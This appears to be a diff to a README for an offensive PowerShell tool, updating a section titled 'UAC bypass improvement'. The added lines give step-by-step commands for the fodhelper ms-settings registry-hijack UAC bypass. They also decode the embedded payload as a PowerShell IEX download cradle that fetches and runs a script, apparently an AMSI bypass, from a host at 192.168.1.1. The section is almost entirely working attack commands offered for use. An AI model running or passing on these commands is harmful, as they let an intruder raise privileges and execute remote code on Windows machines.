@@ -37,10 +37,13 @@ Review its manual specified as comments at the first lines of the script, and th
 
 **UAC BYPASS IMPROVEMENT:**
 
+From powershell throw this commands:
+
 ```
-1st New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -enc SQBFAFg...” -Force
-
-2nd New-ItemProperty -Path HKCU:\Software\Classes\mssettings\shell\open\command -Name DelegateExecute -PropertyType String -Force
-
-3rd 
+1. New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -enc SQBFAFg...” -Force
+2. New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyTypeString -Force
+3. Execute fodhelper.exe -> if you are in a x86 process: c:\windows\sysnative\cmd.exe /c c:\windows\system32\fodhelper.exe
+						             -> if you are in a x64 process: c:\windows\system32\fodhelper.exe
+						
+The base64 powershell encoded string was -> IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/amsi.txt')
 ```
